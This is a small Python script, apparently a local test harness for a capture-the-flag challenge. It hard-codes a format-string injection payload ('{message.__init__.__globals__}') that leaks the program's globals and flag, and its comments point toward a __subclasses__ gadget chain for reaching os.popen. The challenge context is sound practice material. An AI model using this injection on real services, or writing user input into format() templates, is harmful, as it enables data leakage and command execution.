import dataclasses
import errno
import os
import random

# FLAG = os.environ.get("FLAG")
FLAG = "test{flag}"

if not FLAG:
    print("If you're running this locally, please create a fake flag env variable.")
    print("If you're seeing this on the remote server, please contact the admins.")
    exit(errno.ENOENT)


@dataclasses.dataclass
class Message:
    message: str

    def __str__(self):
        return self.message

    __repr__ = __str__


MESSAGES = [
    Message(message="Thank you for using our service."),
    Message(message="Here is your pattern:"),
    Message(message="Until next time!")
]
# random.choice(MESSAGES).__class__.__mro__[1].__subclasses__()
# pattern = input("pattern> ")
# payload to popout os popen
pattern = "{message.__init__.__globals__}"
# count = int(input("count> "))
count = 1

final_pattern = pattern * count
print(f"{{message}} {final_pattern}".format(message=random.choice(MESSAGES)))
